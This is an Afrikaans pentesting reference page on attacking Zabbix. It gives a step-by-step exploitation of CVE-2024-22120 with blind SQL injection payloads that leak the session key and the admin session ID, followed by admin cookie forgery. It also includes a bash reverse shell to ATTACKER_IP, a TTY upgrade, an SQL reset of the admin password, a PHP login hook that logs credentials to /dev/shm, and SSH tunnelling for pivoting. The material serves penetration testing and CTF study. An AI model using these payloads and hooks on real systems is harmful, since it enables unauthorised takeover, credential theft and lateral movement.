# Zabbix Sekuriteit

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

Zabbix is 'n monitoring-platform wat 'n web UI blootstel (tipies agter Apache/Nginx) en 'n server-komponent wat ook die Zabbix-protokol op TCP/10051 (server/trapper) en 'n agent op TCP/10050 gebruik. Tydens engagements kan jy die volgende teëkom:

- Web UI: HTTP(S) virtual host like zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

Nuttige cookie-formaat: zbx_session is Base64 van 'n kompakte JSON-objek wat minstens sessionid, serverCheckResult, serverCheckTime en sign insluit. Die sign is 'n HMAC van die JSON payload.

## zbx_session cookie internals

Onlangse Zabbix-weergawes bereken die cookie soos volg:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

As jy die globale session_key en 'n geldige admin sessionid kan herwin, kan jy 'n geldige Admin-cookie offline vervals en by die UI autentiseer.

## CVE-2024-22120 — Tydgebaseerde blind SQLi in Zabbix Server ouditlog

Geaffekteerde weergawes (soos openbaar gedokumenteer):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Samevatting van die kwesbaarheid:

- Wanneer 'n Script-uitvoering in die Zabbix Server se ouditlog opgeneem word, word die clientip-veld nie gesanitiseer nie en in SQL gekonkateneer, wat tydgebaseerde blind SQLi via die serverkomponent moontlik maak.
- Dit kan misbruik word deur 'n gemaakte "command" versoek na die Zabbix server port 10051 te stuur met 'n geldige laaggeprivilegieerde sessionid, 'n hostid waartoe die gebruiker toegang het, en 'n toegelate scriptid.

Voorvereistes en ontdekkingwenke:

- sessionid: Vanaf guest/login in die web UI, decodeer zbx_session (Base64) om die sessionid te kry.
- hostid: Besigtig via web UI-versoeke (bv. Monitoring → Hosts) of onderskep met 'n proxy; algemene verstek is 10084.
- scriptid: Slegs scripts wat aan die huidige rol toegestaan is, sal uitgevoer word; verifieer deur die script-menu/AJAX-antwoorde na te gaan. Versteke soos 1 of 2 word dikwels toegelaat; 3 kan geweier word.

### Eksploitasievloei

1) Trigger 'n oudit-invoeging met SQLi in clientip

- Verbind met TCP/10051 en stuur 'n Zabbix-framed boodskap met request="command" wat sid, hostid, scriptid, en clientip insluit, waar clientip op 'n SQL-uitdrukking gestel word wat deur die bediener gekonkateneer en geëvalueer sal word.

Minimale boodskap (JSON body) velde:
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
Die volledige wire formaat is: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. Jy kan pwntools of jou eie socket code gebruik om dit te frame.

2) Time-bruteforce secrets via conditional sleep

Gebruik conditional expressions om hex-encoded secrets een char op 'n slag te leak deur response time te meet. Voorbeelde wat in die praktyk gewerk het:

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Admin session_id (userid=1) uit sessions:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Aantekeninge:

- charset: 32 hex karakters [0-9a-f]
- Kies T_TRUE >> T_FALSE (bv., 10 vs 1) en meet wall-clock per poging
- Maak seker jou scriptid is inderdaad gemagtig vir die gebruiker; anders word geen audit-ry geskep nie en sal timing nie werk

3) Forge Admin cookie

Sodra jy het:

- session_key: 32-hex vanaf config.session_key
- admin_sessionid: 32-hex vanaf sessions.sessionid vir userid=1

Compute:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

Stel die cookie zbx_session op hierdie waarde en GET /zabbix.php?action=dashboard.view om Admin toegang te valideer.

### Kant-en-klare tooling

- Public PoC automatiseer: bruteforce van session_key en admin sessionid, en cookie forging; vereis pwntools en requests.
- Parameters wat jy tipies moet verskaf sluit in: --ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid, en opsioneel 'n bekende --admin-sid om brute te oorskryf.

## RCE via Script execution (post-Admin)

Met Admin toegang in die UI kan jy vooraf gedefinieerde Scripts teen gemonitorde hosts uitvoer. As agents/hosts script-opdragte plaaslik uitvoer, lewer dit code execution op daardie stelsels op (dikwels as die zabbix user op Linux-hosts):

- Vinnige kontrole: voer id uit om gebruikerskonteks te bevestig
- Reverse shell voorbeeld:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
TTY-opgradering (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
Indien jy DB-toegang het, is 'n alternatief vir die vervalsing van 'n cookie om die Admin-wagwoord na die gedokumenteerde bcrypt vir "zabbix" te herstel:
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Credential capture via login hook (post-exploitation)

As file write op die web UI-server moontlik is, kan jy tydelik 'n logging snippet' byvoeg in /usr/share/zabbix/index.php rondom die form-based login branch om credentials te capture:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
Gebruikers verifieer normaalweg; lees /dev/shm/creds.txt daarna. Verwyder die hook wanneer klaar.

## Pivoting to internal services

Selfs al is die shell van die service account /usr/sbin/nologin, sal die toevoeging van 'n SSH authorized_keys-inskrywing en die gebruik van -N -L plaaslike port-forwarding na loopback-only dienste toelaat (bv. CI/CD op 8111):
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
Sien meer tunneling-patrone in: Kyk na [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## Operasionele wenke

- Valideer dat scriptid vir die huidige rol toegelaat is (guest mag ’n beperkte stel hê)
- Timing brute kan stadig wees; stoor die herstelde admin sessionid in cache en hergebruik dit
- Die JSON wat na 10051 gestuur word, moet ingekader wees met die ZBXD\x01 header en ’n little-endian lengte

## Verwysings

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
